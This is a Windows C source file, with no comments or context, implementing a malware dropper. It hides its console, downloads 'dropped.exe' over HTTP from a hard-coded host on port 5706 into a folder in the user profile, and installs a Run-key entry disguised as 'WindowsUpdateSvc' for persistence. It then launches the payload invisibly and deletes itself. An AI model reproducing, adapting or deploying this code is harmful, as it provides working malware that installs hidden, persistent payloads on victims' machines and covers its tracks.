#include <windows.h>
#include <wininet.h>
#include <lmcons.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

static int g(wchar_t *d, DWORD n) {
    wchar_t u[UNLEN + 1];
    DWORD l = UNLEN + 1;
    if (!GetUserNameW(u, &l)) return 0;
    wcscpy(d, L"C:\\Users\\");
    wcscat(d, u);
    wcscat(d, L"\\bingle");
    return 1;
}

static int f(LPCWSTR h, INTERNET_PORT p, LPCWSTR r, LPCWSTR l) {
    HINTERNET a = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
    if (!a) return 0;

    WCHAR u[512];
    wsprintfW(u, L"http://%s:%d/%s", h, p, r);

    HINTERNET b = InternetOpenUrlW(a, u, 0, 0, INTERNET_FLAG_RELOAD, 0);
    if (!b) { InternetCloseHandle(a); return 0; }

    HANDLE c = CreateFileW(l, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    if (c == INVALID_HANDLE_VALUE) { InternetCloseHandle(b); InternetCloseHandle(a); return 0; }

    BYTE v[4096];
    DWORD br;
    while (InternetReadFile(b, v, sizeof(v), &br) && br > 0) {
        DWORD bw;
        WriteFile(c, v, br, &bw, 0);
    }

    CloseHandle(c); InternetCloseHandle(b); InternetCloseHandle(a);
    return 1;
}

static int i(LPCWSTR p) {
    HKEY k;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_SET_VALUE, &k) != ERROR_SUCCESS)
        return 0;

    WCHAR f[MAX_PATH];
    GetFullPathNameW(p, MAX_PATH, f, 0);

    DWORD r = RegSetValueExW(k, L"WindowsUpdateSvc", 0, REG_SZ,
                             (LPBYTE)f, (wcslen(f) + 1) * sizeof(WCHAR));
    RegCloseKey(k);
    return (r == ERROR_SUCCESS);
}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lC, int nC) {
    HWND w = GetConsoleWindow();
    if (w) ShowWindow(w, SW_HIDE);

    wchar_t d[MAX_PATH];
    if (!g(d, MAX_PATH)) return 1;

    CreateDirectoryW(d, 0);

    wchar_t l[MAX_PATH];
    wcscpy(l, d);
    wcscat(l, L"\\dropped.exe");

    if (!f(L"192.168.1.230", 5706, L"dropped.exe", l)) return 1;

    if (!i(l)) return 2;

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(l, 0, 0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    WCHAR m[MAX_PATH];
    GetModuleFileNameW(0, m, MAX_PATH);

    WCHAR n[MAX_PATH + 100];
    wsprintfW(n, L"cmd.exe /c timeout /t 2 & del \"%s\"", m);

    STARTUPINFOW s2 = { sizeof(s2) };
    PROCESS_INFORMATION p2;
    CreateProcessW(0, n, 0, 0, FALSE, CREATE_NO_WINDOW, 0, 0, &s2, &p2);
    CloseHandle(p2.hProcess);
    CloseHandle(p2.hThread);

    return 0;
}